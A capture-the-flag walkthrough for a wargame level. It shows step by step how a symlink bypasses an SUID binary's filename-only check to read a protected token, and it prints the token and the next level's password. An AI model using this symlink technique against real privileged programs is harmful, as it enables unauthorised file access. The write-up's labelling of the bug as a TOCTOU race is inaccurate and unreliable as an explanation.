
Level08:

- Discovered: SUID binary located in home directory.
  Ran: ls -l level08
  Output:
    -rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
    → Owned by flag08 with SUID bit, group-executable by level08
    → Also found: token (not readable, owned by flag08)

- Confirmed binary properties:
  Ran: file level08
  Output: ELF 32-bit, dynamically linked, not stripped

- Attempted access to 'token' via binary:
  Ran: ./level08 token
  Output: "You may not access 'token'"

- Reverse engineered logic using ltrace and strace:
  Ran: ltrace ./level08 token
  Observed:
    - strstr(argv[1], "token") → if true, exits immediately
  Ran: ./level08 /tmp/test.txt → opened and printed file if not named "token"

- Vulnerability: Only the *filename string* is checked via strstr()
  → Does NOT check real path or symlink target

- Exploit strategy: symlink attack
  Created a symbolic link with a different name:
    ln -s /home/user/level08/token /tmp/bin/target
    ./level08 /tmp/bin/target

- Binary opens and reads the file behind the symlink as flag08
  → token file is read and printed to stdout

- Output:
  quif5eloekouj29ke0vouxean

- Lesson:
  - Symlink pointing to restricted file bypassed naive filename check
  - Demonstrates classic TOCTOU bug (Time-of-check vs Time-of-use)
  - Symlinks are resolved lazily, and relative paths are interpreted from symlink location

- Flag retrieved and used to access level09 : 25749xKZ8L7DkSCwJkT9dyv6f > levl09

